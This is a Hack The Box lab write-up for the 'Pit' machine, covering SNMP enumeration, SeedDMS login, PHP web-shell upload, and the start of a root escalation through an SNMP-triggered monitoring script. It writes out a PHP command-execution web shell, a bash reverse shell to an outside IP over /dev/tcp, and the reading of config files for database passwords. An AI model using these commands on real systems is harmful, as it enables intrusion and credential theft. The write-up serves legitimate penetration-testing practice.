<!doctype html><html lang=en><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="ie=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=author content="[map[name:MindYourPrivacy]]"><meta name=description content="Short description of your site here"><meta name=keywords content=",selinux,udp,snmp,"><meta name=robots content="noodp"><meta name=theme-color content><link rel=canonical href=https://0xade1.github.io/posts/2021/10/htb-pit/><title>HTB - Pit :: Poney Island â€” Welcome to Pwnie Island</title><link href=https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css rel=stylesheet type=text/css><link rel=stylesheet href=https://0xade1.github.io/main.d5b952c3b0131e8ecd6d80f97c5fae89d216a2c29dfa0754010b808bdb098871.css><link rel=apple-touch-icon sizes=180x180 href=https://0xade1.github.io/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=https://0xade1.github.io/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=https://0xade1.github.io/favicon-16x16.png><link rel=manifest href=https://0xade1.github.io/site.webmanifest><link rel=mask-icon href=https://0xade1.github.io/safari-pinned-tab.svg color=#1b1c1d><link rel="shortcut icon" href=https://0xade1.github.io/favicon.ico><meta name=msapplication-TileColor content="#1b1c1d"><meta name=theme-color content="#1b1c1d"><meta itemprop=name content="HTB - Pit"><meta itemprop=description content="Short description of your site here"><meta itemprop=datePublished content="2021-10-02T18:04:13+08:00"><meta itemprop=dateModified content="2021-10-02T18:04:13+08:00"><meta itemprop=wordCount content="3950"><meta itemprop=image content="https://0xade1.github.io"><meta itemprop=keywords content="selinux,udp,snmp,,"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://0xade1.github.io"><meta name=twitter:title content="HTB - Pit"><meta name=twitter:description content="Short description of your site here"><meta property="og:title" content="HTB - Pit"><meta property="og:description" content="Short description of your site here"><meta property="og:type" content="article"><meta property="og:url" content="https://0xade1.github.io/posts/2021/10/htb-pit/"><meta property="og:image" content="https://0xade1.github.io"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-10-02T18:04:13+08:00"><meta property="article:modified_time" content="2021-10-02T18:04:13+08:00"><meta property="article:published_time" content="2021-10-02 18:04:13 +0800 +0800"></head><body><div class=container><header class=header><span class=header__inner><a href=https://0xade1.github.io/ style=text-decoration:none><div class=logo><span class=logo__mark>></span>
<span class=logo__text># cd /root/</span>
<span class=logo__cursor></span></div></a><span class=header__right><nav class=menu><ul class=menu__inner><li><a href=https://0xade1.github.io/about/>About</a></li><li><a href=https://0xade1.github.io/categories/>Categories</a></li><li><a href=https://0xade1.github.io/posts/>Posts</a></li><li><a href=https://0xade1.github.io/series/>Series</a></li><li><a href=https://0xade1.github.io/tags/>Tags</a></li></ul></nav><span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg></span></span></span></header><div class=content><main class=post><div class=post-info><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" ecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>2021-10-02
|</div><article><h1 class=post-title><a href=https://0xade1.github.io/posts/2021/10/htb-pit/>HTB - Pit</a></h1><div class=post-info><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 01-2.83.0L2 12V2h10l8.59 8.59a2 2 0 010 2.82z"/><line x1="7" y1="7" x2="7" y2="7"/></svg><span class=tag><a href=https://0xade1.github.io/tags/selinux/>selinux</a></span>
<span class=tag><a href=https://0xade1.github.io/tags/udp/>udp</a></span>
<span class=tag><a href=https://0xade1.github.io/tags/snmp/>snmp</a></span>
<span class=tag><a href=https://0xade1.github.io/tags//></a></span></p></div><div class=post-excerpt>Short description of your site here</div><div class=post-content><p><img src="https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Ftse2.mm.bing.net%2Fth%3Fid%3DOIP.-PQhNZFI16lKFUGotjn-EQHaCz%26pid%3DApi&f=1" alt=SELinux></p><p>Rustscan miserably fails to find port 9090</p><pre><code>rustscan 10.10.10.241
</code></pre><p>Old good nmap is more reliable:</p><div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>nmap -vvv -p- -T4 --min-rate<span style=color:#ff79c6>=</span><span style=color:#bd93f9>3000</span> 10.10.10.241
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PORT     STATE SERVICE    REASON
</span></span><span style=display:flex><span>22/tcp   open  ssh        syn-ack
</span></span><span style=display:flex><span>80/tcp   open  http       syn-ack
</span></span><span style=display:flex><span>9090/tcp open  zeus-admin syn-ack
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>nmap -p22,80,9090 -sC -sV -T4 10.10.10.241
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PORT   STATE SERVICE VERSION
</span></span><span style=display:flex><span>22/tcp open  ssh     OpenSSH 8.0 <span style=color:#ff79c6>(</span>protocol 2.0<span style=color:#ff79c6>)</span>
</span></span><span style=display:flex><span>| ssh-hostkey:
</span></span><span style=display:flex><span>|   <span style=color:#bd93f9>3072</span> 6f:c3:40:8f:69:50:69:5a:57:d7:9c:4e:7b:1b:94:96 <span style=color:#ff79c6>(</span>RSA<span style=color:#ff79c6>)</span>
</span></span><span style=display:flex><span>|   <span style=color:#bd93f9>256</span> c2:6f:f8ðŸ†Ža1:20:83:d1:60ðŸ†Žcf:63:2d:c8:65:b7 <span style=color:#ff79c6>(</span>ECDSA<span style=color:#ff79c6>)</span>
</span></span><span style=display:flex><span>|_  <span style=color:#bd93f9>256</span> 6b:65:6c:a6:92:e5:cc:76:17:5a:2f:9a:e7:50:c3:50 <span style=color:#ff79c6>(</span>ED25519<span style=color:#ff79c6>)</span>
</span></span><span style=display:flex><span>80/tcp   open  http            nginx 1.14.1
</span></span><span style=display:flex><span>|_http-server-header: nginx/1.14.1
</span></span><span style=display:flex><span>|_http-title: Test Page <span style=color:#ff79c6>for</span> the Nginx HTTP Server on Red Hat Enterprise Linux
</span></span><span style=display:flex><span>9090/tcp open  ssl/zeus-admin?
</span></span><span style=display:flex><span>|_    <span style=color:#ff79c6>[</span>...<span style=color:#ff79c6>]</span>
</span></span><span style=display:flex><span>| ssl-cert: Subject: <span style=color:#8be9fd;font-style:italic>commonName</span><span style=color:#ff79c6>=</span>dms-pit.htb/organizationName<span style=color:#ff79c6>=</span>4cd9329523184b0ea52ba0d20a1a6f92/countryName<span style=color:#ff79c6>=</span>US
</span></span><span style=display:flex><span>| Subject Alternative Name: DNS:dms-pit.htb, DNS:localhost, IP Address:127.0.0.1
</span></span></code></pre></td></tr></table></div></div><p>Nginx has no known vulnerabilities</p><p>gobuster is not revealing anything interesting on dms-pit.htb domain</p><h2 id=udp-scan>UDP Scan</h2><div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>sudo nmap -sU -sV --top-ports <span style=color:#bd93f9>10</span>  10.10.10.241
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PORT     STATE    SERVICE      VERSION
</span></span><span style=display:flex><span><span style=color:#ff79c6>[</span>..<span style=color:#ff79c6>]</span>
</span></span><span style=display:flex><span>161/udp  open     snmp         SNMPv1 server; net-snmp SNMPv3 server <span style=color:#ff79c6>(</span>public<span style=color:#ff79c6>)</span>
</span></span></code></pre></td></tr></table></div></div><p><a href=https://0xade1.github.io/posts/2021/10/dont-overlook-snmp-mibs-exploration/#discover-a-community-string-with-onesixtyone>onesixtyone</a> is an enumeration tool to find SNMP community string. We find the <code>public</code> community string.</p><pre><code>onesixtyone 10.10.10.241
[..]
10.10.10.241 [public] Linux pit.htb 4.18.0-305.10.2.el8_4.x86_64 #1 SMP Tue Jul 20 17:25:16 UTC 2021 x86_6
</code></pre><p>Installing snmwalk with mibs extension allows to reveal some web root we could not fuzz with our dictionary:</p><pre><code>snmpwalk -v1 -c public 10.10.10.241 dskPath
UCD-SNMP-MIB::dskPath.1 = STRING: /
UCD-SNMP-MIB::dskPath.2 = STRING: /var/www/htmly/seeddms51x/seeddms
</code></pre><p><strong><a href=http://dms-pit.htb/seeddms51x/seeddms>http://dms-pit.htb/seeddms51x/seeddms</a></strong> is the sign in page for SeedDMS free document management system - <a href=https://www.seeddms.org>www.seeddms.org</a> and according to response header, it is run with <code>X-Powered-By PHP/7.2.24</code></p><p>We suffer from a timeout issue which prevents us to walk through any OID as it hangs. Adding <code>-t 120 -r3</code> to extend timeout and retry did not work:</p><pre><code>NET-SNMP-EXTEND-MIB::nsExtendOutputFull.&quot;monitoring&quot; = STRING: Memory usage
&lt;it hangs here, no more output&gt;
</code></pre><p>At this stage I suspect the service may be broken, and refer to the documentation. Unfortunately, the doc on <a href=http://www.net-snmp.org/docs/mibs/netSnmpExtendMIB.html#netSnmpExtendMIB>NET-SNMP-EXTEND-MIB</a> is Deprecated and I can&rsquo;t get more details. We can still <a href=https://0xade1.github.io/posts/2021/10/dont-overlook-snmp-mibs-exploration/#troubleshoot-hanging-issues>troubleshoot snmp with this technique</a> by moving up the tree then expanding the MIBS tree definition, to see what else we could not explore due to this timeout issue.</p><pre><code>snmptranslate -On -IR NET-SNMP-EXTEND-MIB::nsExtendOutputFull
.1.3.6.1.4.1.8072.1.3.2.3.1.2

snmptranslate .1.3.6.1.4.1.8072.1.3.2.3.1
NET-SNMP-EXTEND-MIB::nsExtendOutput1Entry

snmptranslate .1.3.6.1.4.1.8072.1.3.2.3
NET-SNMP-EXTEND-MIB::nsExtendOutput1Table

snmptranslate .1.3.6.1.4.1.8072.1.3.2
NET-SNMP-EXTEND-MIB::nsExtendObjects
</code></pre><p>I can now display the entire subtree to find interesting MIBS:</p><pre tabindex=0><code>snmptranslate -Tp NET-SNMP-EXTEND-MIB::nsExtendObjects
+--nsExtendObjects(2)
   |
   +-- [..]
   |
   +--nsExtendOutput1Table(3)
   |  |
   |  +--nsExtendOutput1Entry(1)
   |     |
   |     +-- -R-- String    nsExtendOutput1Line(1)
   |     |        Textual Convention: DisplayString
   |     |        Size: 0..255
   |     +-- -R-- String    nsExtendOutputFull(2)
   |     |        Textual Convention: DisplayString
   |     |        Size: 0..255
   |     +-- -R-- Integer32 nsExtendOutNumLines(3)
   |     +-- -R-- Integer32 nsExtendResult(4)
   |
   +--nsExtendOutput2Table(4)
      |
      +--nsExtendOutput2Entry(1)
         |  Index: nsExtendToken, nsExtendLineIndex
         |
         +-- ---- INTEGER   nsExtendLineIndex(1)
         |        Range: 1..1024
         +-- -R-- String    nsExtendOutLine(2)
                  Textual Convention: DisplayString
                  Size: 0..255
</code></pre><p>We can simply read each lines instead of the whole output with <code>nsExtendOutLine</code>:</p><pre><code>snmpwalk -v1 -c public 10.10.10.241 nsExtendOutLine
NET-SNMP-EXTEND-MIB::nsExtendOutLine.&quot;monitoring&quot;.1 = STRING: Memory usage
NET-SNMP-EXTEND-MIB::nsExtendOutLine.&quot;monitoring&quot;.2 = STRING:               total        used        free      shared  buff/cache   available
NET-SNMP-EXTEND-MIB::nsExtendOutLine.&quot;monitoring&quot;.3 = STRING: Mem:          3.8Gi       459Mi       3.0Gi        40Mi       368Mi       3.1Gi
NET-SNMP-EXTEND-MIB::nsExtendOutLine.&quot;monitoring&quot;.4 = STRING: Swap:         1.9Gi          0B       1.9Gi
NET-SNMP-EXTEND-MIB::nsExtendOutLine.&quot;monitoring&quot;.5 = STRING: Database status
NET-SNMP-EXTEND-MIB::nsExtendOutLine.&quot;monitoring&quot;.6 = STRING: OK - Connection to database successful.
NET-SNMP-EXTEND-MIB::nsExtendOutLine.&quot;monitoring&quot;.7 = STRING: System release info
NET-SNMP-EXTEND-MIB::nsExtendOutLine.&quot;monitoring&quot;.8 = STRING: CentOS Linux release 8.3.2011
NET-SNMP-EXTEND-MIB::nsExtendOutLine.&quot;monitoring&quot;.9 = STRING: SELinux Settings
NET-SNMP-EXTEND-MIB::nsExtendOutLine.&quot;monitoring&quot;.10 = STRING: user
NET-SNMP-EXTEND-MIB::nsExtendOutLine.&quot;monitoring&quot;.11 = STRING:
[..]
NET-SNMP-EXTEND-MIB::nsExtendOutLine.&quot;monitoring&quot;.25 = STRING: Login Name           SELinux User         MLS/MCS Range        Service
NET-SNMP-EXTEND-MIB::nsExtendOutLine.&quot;monitoring&quot;.26 = STRING:
NET-SNMP-EXTEND-MIB::nsExtendOutLine.&quot;monitoring&quot;.27 = STRING: __default__          unconfined_u         s0-s0:c0.c1023       *
NET-SNMP-EXTEND-MIB::nsExtendOutLine.&quot;monitoring&quot;.28 = STRING: michelle             user_u               s0                   *
NET-SNMP-EXTEND-MIB::nsExtendOutLine.&quot;monitoring&quot;.29 = STRING: root                 unconfined_u         s0-s0:c0.c1023       *
NET-SNMP-EXTEND-MIB::nsExtendOutLine.&quot;monitoring&quot;.30 = STRING: System uptime
NET-SNMP-EXTEND-MIB::nsExtendOutLine.&quot;monitoring&quot;.31 = STRING:  03:28:34 up 2 days,  2:16,  0 users,  load average: 0.09, 0.03, 0.01
End of MIB
</code></pre><p>We discover username <strong>michelle</strong> and the system version: <strong>CentOS Linux release 8.3.2011</strong></p><h2 id=shell-as-michelle>Shell as Michelle</h2><p>searchsploit find at least 2 RCE vulnerabilities for that DMS:</p><table><thead><tr><th>Exploit Title</th><th>Path</th></tr></thead><tbody><tr><td>Seeddms 5.1.10 - Remote Command Execution (RCE) (Authenticated)</td><td>php/webapps/50062.py</td></tr><tr><td>SeedDMS versions &lt; 5.1.11 - Remote Command Execution</td><td>php/webapps/47022.txt</td></tr></tbody></table><p>but both require at least username and password, we try with <strong>michelle</strong> and common passwords and we can finally sign in <a href=http://dms-pit.htb/seeddms51x/seeddms>http://dms-pit.htb/seeddms51x/seeddms</a> with <strong>michelle:michelle</strong></p><p>There is an Administrator Notes about recent upgrade to 5.1.15:</p><pre><code>    Dear colleagues, Because of security issues in the previously installed version (5.1.10),
    I upgraded SeedDMS to version 5.1.15. See the attached CHANGELOG file for more information.
    If you find any issues, please report them immediately to admin@dms-pit.htb.
</code></pre><p>Michelle has permissions to upload files, so we can attempt to upload a webshell:</p><pre><code>echo '&lt;?php echo system($_GET[&quot;cmd&quot;]);?&gt;' &gt; ~/Downloads/sh.php
</code></pre><p>Once uploaded, we click on the Download button; however instead of executing, it downloads as an attachment:</p><p>Request shows a <code>documentid=30 and version=1</code>:</p><pre><code>GET /seeddms51x/seeddms/op/op.Download.php?documentid=30&amp;version=1 HTTP/1.1
[..]
Cookie: mydms_session=a5522439228422452acad40d8b1fba6f
</code></pre><p>Response:</p><pre><code>HTTP/1.1 200 OK
[..]
Content-Transfer-Encoding: binary
Content-Disposition: attachment; filename=&quot;sh.php&quot;; filename*=UTF-8''sh.php
Cache-Control: must-revalidate

&lt;?php echo system($_GET[&quot;cmd&quot;]);?&gt;
</code></pre><p>We have to find where is the file inside seeddms if we want to figure out how to execute it as a PHP page instead of downloading. Searching source code in github, we find this repo with clear information on download: <a href=https://github.com/rachmari/seeddms#data-storage>https://github.com/rachmari/seeddms#data-storage</a></p><pre><code>A content directory is located within the data directory named 1048576 by default. This directory name can also be changed in the settings.xml file. When documents are uploaded using SeedDMS, the files are stored in the data/1048576 directory.

The directories within 1048576 are also numbered. The number corresponds to the document id in the mysql table tblDocuments. The document id directory is a flat directory that contains all of a document's files (including attachments) for every version of that documet. Files are named using numbers and letters. File names that only contain a number indicate the version of the document.
</code></pre><p>Basically it translates into this file path <strong>/seeddms51x/seeddms/1048576/$documentid/$version</strong></p><p>Looking at <strong>op.Download.php</strong> <a href=https://github.com/rachmari/seeddms/blob/master/op/op.Download.php>source code</a>, we find:</p><div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>$filepath</span> <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>$dms</span><span style=color:#ff79c6>-&gt;</span><span style=color:#50fa7b>contentDir</span> <span style=color:#ff79c6>.</span> <span style=color:#8be9fd;font-style:italic>$file</span><span style=color:#ff79c6>-&gt;</span><span style=color:#50fa7b>getPath</span>();
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>function</span> <span style=color:#50fa7b>getPath</span>() { <span style=color:#ff79c6>return</span> <span style=color:#8be9fd;font-style:italic>$this</span><span style=color:#ff79c6>-&gt;</span><span style=color:#50fa7b>_document</span><span style=color:#ff79c6>-&gt;</span><span style=color:#50fa7b>getDir</span>() <span style=color:#ff79c6>.</span> <span style=color:#8be9fd;font-style:italic>$this</span><span style=color:#ff79c6>-&gt;</span><span style=color:#50fa7b>_version</span> <span style=color:#ff79c6>.</span> <span style=color:#8be9fd;font-style:italic>$this</span><span style=color:#ff79c6>-&gt;</span><span style=color:#50fa7b>_fileType</span>; }
</span></span></code></pre></td></tr></table></div></div><p>which suggests the fileType (the file extension) must be appended. We can try with curl:</p><pre><code>curl http://dms-pit.htb/seeddms51x/data/1048576/31/1.php?cmd=id -H &quot;Cookie: mydms_session=a5522439228422452acad40d8b1fba6f&quot;
uid=992(nginx) gid=988(nginx) groups=988(nginx) context=system_u:system_r:httpd_t:s0
uid=992(nginx) gid=988(nginx) groups=988(nginx) context=system_u:system_r:httpd_t:s0
</code></pre><p>it works brilliantly, so now we can get a reverse shell. Note the server delete files regularly so we may have to reupload the file several time.</p><p>We can use basic urlencoded reverse shell:</p><pre><code>plain:   bash -c &quot;bash -i &gt;&amp;   /dev/tcp/10.10.14.53/443 0&gt;&amp;1&quot;
encoded: bash+-c+%22bash+-i+&gt;%26+/dev/tcp/10.10.14.53/443+0&gt;%261%22
</code></pre><p>We can&rsquo;t obtain the reverse shell:</p><pre><code>URL=&quot;http://dms-pit.htb/seeddms51x/data/1048576/35/1.php&quot;
curl -vvv -G $URL -H &quot;Cookie: mydms_session=a5522439228422452acad40d8b1fba6f&quot; \
--data-urlencode &quot;cmd=bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.53/443 0&gt;&amp;1'&quot;
</code></pre><p>So we need to try different way or explore the file system:</p><p>ls -l ../../conf</p><pre><code>total 36
-r--------. 1 nginx nginx 11672 Mar 14 2018 settings.xml
-rw-r--r--. 1 nginx nginx 13702 Sep 27 2017 settings.xml.template
-rw-r--r--. 1 nginx nginx 4247 Feb 20 2013 stopwords.txt
</code></pre><p>find /var/www/html/seeddms51x/ -name settings.xml</p><pre><code>/var/www/html/seeddms51x/data/conf/settings.xml
/var/www/html/seeddms51x/conf/settings.xml
</code></pre><p>cat ../../conf/settings.xml | grep -i pass</p><pre><code>[..]
&lt;database dbDriver=&quot;sqlite&quot; dbHostname=&quot;localhost&quot; dbDatabase=&quot;/home/www-data/seeddms51x/data/content.db&quot; dbUser=&quot;seeddms&quot; dbPass=&quot;seeddms&quot; doNotCheckVersion=&quot;false&quot;&gt;
[..]
</code></pre><p>cat /var/www/html/seeddms51x/conf/settings.xml</p><pre><code>[..]
&lt;database dbDriver=&quot;mysql&quot; dbHostname=&quot;localhost&quot; dbDatabase=&quot;seeddms&quot; dbUser=&quot;seeddms&quot; dbPass=&quot;ied^ieY6xoquu&quot; doNotCheckVersion=&quot;false&quot;&gt;
[..]
</code></pre><p>We have to visit the webpage at port 9090 to successful sign in with <strong>michelle:ied^ieY6xoquu</strong></p><p>The about section informs we are on <a href=https://cockpit-project.org/>https://cockpit-project.org/</a> version 224.2</p><p>There is a webshell accessible from <a href=https://dms-pit.htb:9090/system/terminal>https://dms-pit.htb:9090/system/terminal</a> , so we can</p><pre><code>[I] âžœ nc -lnvp 11111
Connection from 10.10.10.241:52674
[michelle@pit ~]$ cat user.txt
cat user.txt
85f4cffb98144f909ec8a43be9655d53
</code></pre><h1 id=privesc>Privesc</h1><p>Going back to snmp, there is a process of interest:</p><pre><code>snmpwalk -Os -v1 -c public 10.10.10.241 nsExtendObjects
[..]
nsExtendCommand.&quot;monitoring&quot; = STRING: /usr/bin/monitor
[..]
nsExtendExecType.&quot;monitoring&quot; = INTEGER: exec(1)
nsExtendRunType.&quot;monitoring&quot; = INTEGER: run-on-read(1)
[..]
nsExtendOutput1Line.&quot;monitoring&quot; = STRING: Memory usage
Timeout: No Response from 10.10.10.241
</code></pre><p>it means that a process runs the command <code>/usr/bin/monitor</code> upon SNMP read event. In other words, every time we execute this snmpwalk command, it will execute this script or binary.</p><p>Let&rsquo;s explore <code>/usr/bin/monitor</code>. It will execute as root any bash script starting with check in the folder <code>/usr/local/monitoring</code>:</p><div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">6
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">7
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">8
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">9
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#ff79c6>[</span>michelle@pit .ssh<span style=color:#ff79c6>]</span>$ ls -l /usr/bin/monitor
</span></span><span style=display:flex><span>-rwxr--r--. <span style=color:#bd93f9>1</span> root root <span style=color:#bd93f9>88</span> Apr <span style=color:#bd93f9>18</span>  <span style=color:#bd93f9>2020</span> /usr/bin/monitor
</span></span><span style=display:flex><span><span style=color:#ff79c6>[</span>michelle@pit .ssh<span style=color:#ff79c6>]</span>$ cat /usr/bin/monitor
</span></span><span style=display:flex><span><span style=color:#6272a4>#!/bin/bash</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>for</span> script in /usr/local/monitoring/check*sh
</span></span><span style=display:flex><span><span style=color:#ff79c6>do</span>
</span></span><span style=display:flex><span>    /bin/bash <span style=color:#8be9fd;font-style:italic>$script</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>done</span>
</span></span></code></pre></td></tr></table></div></div><p>Further exploration of this folder, we observe the <code>+</code> sign on the folder permissions <code>drwxrwx---+</code> and realize that michelle can write in it but cannot read files.</p><div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
